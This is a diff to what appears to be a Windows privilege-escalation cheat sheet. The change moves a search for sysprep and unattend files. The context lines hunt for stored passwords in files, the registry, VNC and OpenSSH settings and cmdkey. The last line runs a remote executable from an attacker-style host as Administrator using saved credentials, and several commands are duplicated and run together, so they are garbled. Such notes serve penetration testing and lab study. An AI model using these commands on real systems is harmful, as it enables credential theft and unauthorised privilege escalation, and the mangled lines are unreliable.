@@ -69,6 +69,8 @@ tasklist /FI "USERNAME ne NT AUTHORITY\SYSTEM" /FI "STATUS eq running"
 
 dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
 
+dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nuldir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
+
 findstr /si password *.xml *.ini *.txt *.configfindstr /si password *.xml *.ini *.txt *.config
 
 REG QUERY HKLM /F "password" /t REG_SZ /S /K
@@ -83,7 +85,7 @@ reg query "HKCU\Software\TightVNC\Server"
 reg query "HKCU\Software\OpenSSH\Agent\Key"
 
 cd C:\
-dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nuldir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
+
 
 cmdkey /list
 runas /savecred /user:WORKGROUP\Administrator "\\10.10.14.16\Share\GIGANTIC_SCREEN.exe"
